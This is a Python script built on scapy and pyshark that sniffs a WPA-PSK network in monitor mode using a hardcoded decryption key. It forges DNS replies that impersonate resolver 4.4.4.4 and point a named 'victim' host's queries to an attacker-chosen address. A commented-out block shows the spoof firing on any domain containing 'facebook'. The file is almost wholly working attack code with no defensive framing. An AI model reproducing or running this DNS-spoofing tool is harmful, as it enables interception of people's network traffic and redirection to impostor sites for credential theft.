import pyshark
from scapy.all import *

victim_addr = '172.20.10.10'
real_dns_addr = '4.4.4.4'
target_ether_addr = '90:fd:61:ef:23:a4'
target_iface = 'en0'

redirect_addr = '172.20.10.8'


def send_back(pkt, domain_name) :
    p = pkt.get_raw_packet()

    dns = DNS(id=p[DNS].id,qr=1,rd=p[DNS].rd,ra=p[DNS].ra,qd=p[DNS].qd,an=DNSRR(rrname=domain_name,ttl=42,rdata=redirect_addr))
    p2 = Ether(dst=target_ether_addr)/IP(src=real_dns_addr,dst=victim_addr)/UDP(sport=53,dport=p[UDP].sport)/dns
    sendp(p2, iface=target_iface)



# Define a packet callback function
def packet_callback(pkt):
    p = pkt.get_raw_packet()

    print(p)

    """
    try :
        domain_name = pkt.dns.get_field_by_showname("Name").fields[0].showname.split(': ', 1)[1]
        domain_name = str(pkt.dns.get_field_by_showname("Name"))

        print(pkt)

        if "facebook" in domain_name:
            send_back(pkt, domain_name)
            print("sent !")


    except Exception as e :
        if "No attribute" not in str(e) :
            print(str(e))
    
    return 
    """
    




# Set up the capture
capture = pyshark.LiveCapture(interface=target_iface,
                            monitor_mode = True, 
                            encryption_type = "WPA-PSK", 
                            decryption_key = "be0792fd4a666056cb27493fa816cf7eebaf40c0a78c59de8fb0076e90b77c8f",
                            use_json = True,
                            include_raw = True
                            )


# Start sniffing packets and run the callback function for each packet
capture.apply_on_packets(packet_callback)